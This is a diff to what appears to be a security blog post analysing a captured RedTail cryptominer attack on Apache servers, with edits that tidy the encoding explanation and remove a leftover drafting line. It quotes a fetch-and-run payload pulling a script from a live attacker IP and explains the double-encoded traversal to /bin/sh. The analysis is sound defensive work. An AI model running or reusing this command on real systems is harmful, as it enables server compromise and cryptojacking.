@@ -34,7 +34,9 @@ Payload: (wget --no-check-certificate -qO- https://178.16.55.224/sh || curl -sk 
 
 A couple of things did stand out to me, most notably the very suspicious looking User-Agent, `libredtail-http`. This user agent is associated with a known cryptomining malware: RedTail, whose staging server is the same one I noticed: `178[.]16[.]55[.]224`.
 
-Otherwise, the use of `%%32$65` is also an immediate red flag, as this is a double-encoded representation of the dot - `.`, used to bypass security filters in order to attempt directory traversal. `/cgi-bin/../../../../../../bin/sh` is the decoded path. A classic directory traversal attack, using multiple `../` to traverse up the directory tree, in an attempt to reach `/bin/sh` the system shell, so that it can execute arbitrary shell commands (fetching the malicious script from the staging server). The threat actor is also using the || (OR) command to ensure that if `wget` is not present on the target system, the command falls back to using `curl` instead to fetch the malicious script.
+Otherwise, the use of `%%32$65` is also an immediate red flag. `%32%65` decodes to 2e, which is the hex for a dot `.`. This is a clever way to bypass filters that might be looking for `%2e` specifically by encoding the percent sign itself or hoping the parser "double-dips" the decoding.
+
+`/cgi-bin/../../../../../../bin/sh` is the decoded path. A classic directory traversal attack, using multiple `../` to traverse up the directory tree, in an attempt to reach `/bin/sh` the system shell, so that it can execute arbitrary shell commands (fetching the malicious script from the staging server). The threat actor is also using the || (OR) command to ensure that if `wget` is not present on the target system, the command falls back to using `curl` instead to fetch the malicious script.
 
 You can also see that at the end, the command indicates that the script is intended to immediately begin scanning for other vulnerable Apache servers to continue infecting. This is the telltale sign of an attempt to add a vulnerable server to a botnet. In this case, the attackers are trying to recruit vulnerable web servers into mining crypto on their behalf.
 
@@ -78,12 +80,6 @@ The collateral damage doesn't stop at CPU exhaustion. The malware I captured inc
 Then there's also the network impact. The command in my logs shows the malware using `wget` to reach out to the C2 server. Cryptominers constantly communicate with mining pools, and this background traffic can saturate the narrow bandwidth of industrial networks like Modbus/TCP or EtherNet/IP. In ICS environments, timing is everything... High network jitter causes timeout errors between the PLC and its I/O devices, potentially triggering an emergency stop and halting production entirely. Depending on the industry, that could be a disaster.
 
 ## The Lazarus Connection
-
-Here's a draft that fits the tone and style of your blog:
-
----
-
-## Nation-State Attribution
 
 There's significant evidence from researchers that RedTail isn't just some random operation running out of a basement. The level of investment in the infrastructure I uncovered: the Estonian shell companies, German hosting, American IP reputation, Albanian burner numbers, private mining pools, and multi-architecture binaries, points toward a nation-state-sponsored actor. Most likely North Korea's Lazarus Group.
 
